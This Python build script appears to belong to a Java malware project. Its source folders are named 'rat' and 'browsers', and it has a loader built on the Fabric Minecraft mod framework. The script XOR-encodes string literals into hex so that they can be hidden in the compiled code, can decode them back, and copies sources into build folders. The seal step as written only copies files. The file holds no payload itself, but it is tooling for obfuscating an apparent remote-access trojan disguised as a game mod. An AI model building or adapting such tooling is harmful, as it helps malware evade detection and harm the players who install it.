import re
import shutil
import sys
from pathlib import Path

CORE = Path(__file__).resolve().parents[1]
ROOT = CORE.parent
GEN = ROOT / "target" / "gen"
SRCS = ("browsers", "config", "sync", "api", "host", "rat")
KEY = 0x5A
RE_E = re.compile(r'S\.e\((?P<q>"""|"|\')(?P<body>(?:\\.|(?!\1).)*)(?P=q)\)', re.DOTALL)
RE_D = re.compile(r'S\.d\("([0-9A-Fa-f]+)"\)')


def xor_hex(s: str) -> str:
    return "".join(f"{b ^ KEY:02X}" for b in s.encode("utf-8"))


def xor_plain(h: str) -> str:
    b = bytes(int(h[i : i + 2], 16) ^ KEY for i in range(0, len(h), 2))
    return b.decode("utf-8")


def java_unescape(body: str) -> str:
    out = []
    i = 0
    while i < len(body):
        c = body[i]
        if c != "\\" or i + 1 >= len(body):
            out.append(c)
            i += 1
            continue
        n = body[i + 1]
        m = {
            "n": "\n",
            "r": "\r",
            "t": "\t",
            "\\": "\\",
            '"': '"',
            "'": "'",
            "0": "\0",
        }
        if n in m:
            out.append(m[n])
            i += 2
            continue
        if n == "u" and i + 5 < len(body):
            out.append(chr(int(body[i + 2 : i + 6], 16)))
            i += 6
            continue
        out.append(n)
        i += 2
    return "".join(out)


def java_escape(s: str) -> str:
    out = []
    for c in s:
        o = ord(c)
        if c == "\\":
            out.append("\\\\")
        elif c == '"':
            out.append('\\"')
        elif c == "\n":
            out.append("\\n")
        elif c == "\r":
            out.append("\\r")
        elif c == "\t":
            out.append("\\t")
        elif o < 32:
            out.append(f"\\u{o:04x}")
        else:
            out.append(c)
    return "".join(out)


def seal_text(src: str) -> str:
    def rep(m: re.Match) -> str:
        plain = java_unescape(m.group("body"))
        return f'S.d("{xor_hex(plain)}")'

    return RE_E.sub(rep, src)


def plain_text(src: str) -> str:
    def rep(m: re.Match) -> str:
        plain = xor_plain(m.group(1))
        return f'S.e("{java_escape(plain)}")'

    return RE_D.sub(rep, src)


def seal() -> int:
    if GEN.exists():
        shutil.rmtree(GEN)
    n = 0
    for folder in SRCS:
        src_root = CORE / folder
        if not src_root.is_dir():
            continue
        for path in src_root.rglob("*.java"):
            rel = path.relative_to(CORE)
            dst = GEN / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            dst.write_text(path.read_text(encoding="utf-8"), encoding="utf-8", newline="\n")
            n += 1
    print(f"[*] copy {n} files -> {GEN}")
    return 0


def plain() -> int:
    n = 0
    for folder in SRCS:
        src_root = CORE / folder
        if not src_root.is_dir():
            continue
        for path in src_root.rglob("*.java"):
            text = path.read_text(encoding="utf-8")
            out = plain_text(text)
            if out != text:
                path.write_text(out, encoding="utf-8", newline="\n")
                n += 1
                print(f"[*] {path.relative_to(CORE)}")
    print(f"[*] plain {n} files")
    return 0


def fab() -> int:
    out_root = ROOT / "target" / "fab_src"
    if out_root.exists():
        shutil.rmtree(out_root)
    src_root = ROOT / "loader" / "src"
    n = 0
    for path in src_root.rglob("*.java"):
        rel = path.relative_to(src_root)
        if str(rel).replace("\\", "/").startswith("net/fabricmc/"):
            dst = out_root / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            dst.write_text(path.read_text(encoding="utf-8"), encoding="utf-8", newline="\n")
            n += 1
            continue
        text = path.read_text(encoding="utf-8")
        dst = out_root / rel
        dst.parent.mkdir(parents=True, exist_ok=True)
        dst.write_text(text, encoding="utf-8", newline="\n")
        n += 1
    print(f"[*] fab copy {n} files -> {out_root}")
    return 0


def main() -> int:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "seal"
    if cmd == "seal":
        return seal()
    if cmd == "plain":
        return plain()
    if cmd == "fab":
        return fab()
    print("usage: seal.py [seal|plain|fab]", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
